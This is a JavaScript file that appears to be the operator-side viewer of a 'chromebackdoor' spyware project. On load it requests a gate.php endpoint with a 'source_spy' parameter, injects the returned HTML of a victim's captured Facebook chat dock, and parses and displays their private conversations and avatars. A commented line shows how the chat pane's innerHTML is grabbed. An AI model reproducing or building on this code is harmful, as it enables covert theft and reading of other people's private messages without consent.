function GetMessage(){
    console.log('start..');
    $('.loading').css('display', 'none');
    var array_convers = [];
    var conversation_listing = $('.titlebarTextWrapper');
    for(var list = 0;list < conversation_listing.length - 1;list++){
        var listing = '<div class="item"><span class="convStart" id="'+list+'" >'+$('.titlebarTextWrapper')[list].innerText+'</span></div>';    
        $('.listingconvers').append(listing);
        array_convers.push($('.titlebarTextWrapper')[list].innerText);
        $('.titlebarTextWrapper')[list]
        $('.convStart')[list].onclick = function(){
            var ids = this.getAttribute('id');
            show_convers(ids);
        }
    }
}

function show_convers(ids){
        var old_span = "";
        var message_array = [];
        var message_owner = [];

        $('.conversationActuel').html('<div class="nameTitle">Conversation title</div>');
        $('.oldmessage .conversation').each(function(index, value){
                var title  = $('.titlebarTextWrapper')[ids].innerText;
                $('.nameTitle').html(title);
                var conversation = $('.oldmessage .conversation')[ids];
                var bullet = conversation.getElementsByClassName('_4tdt');
                for(var x = 0;x < bullet.length;x++){
                    var avatar = bullet[x].querySelector('img');
                    var span = bullet[x].querySelectorAll('span');
                    if(span.length > 1){
                        for(var y = 0;y < span.length; y++){
                            if(avatar != null && span[y].innerText != '' && span[y].innerText != old_span && message_array.indexOf(span[y].innerText) < 0){
                                if(old_span != span[y].innerText){
                                    message_array.push(span[y].innerText);
                                    var div = '<div class="message"><div class="message-left"><img src="'+avatar.src+'" /></div> <div class="message-right">'+span[y].innerText+'</div></div><div class="clear"></div>';
                                    $('.conversationActuel').append(div);
                                    old_span = span[y].innerText;
                                }
                            }
                            else if(avatar == null && span[y].innerText != '' && span[y].innerText != old_span && message_owner.indexOf(span[y].innerText) < 0){
                                    message_owner.push(span[y].innerText);
                                    var div = '<div class="message"><div class="message-rightOwner">'+span[y].innerText+'</div><div class="message-leftOwner"><img src="http://cdn.ipetitions.com/rev/176/assets/v3/img/default-avatar.png" /></div></div><div class="clear"></div>';
                                    $('.conversationActuel').append(div);
                                    old_span = span[y].innerText;                                
                            }
                        }
                    }
                }
            });
}

$(document).ready(function(){
    var urlef  = window.location.href;
    if(urlef.split('id=')[1] != undefined){
        $.get('http://localhost:8888/taff/private/chromebackdoor/web/gate.php?source_spy='+urlef.split('id=')[1], function(data){
            if(data != ''){
                $('.oldmessage').append(data);
                window.setTimeout('GetMessage()',5000);
            }
        });
    }
});

//source = document.getElementById('pagelet_dock').innerHTML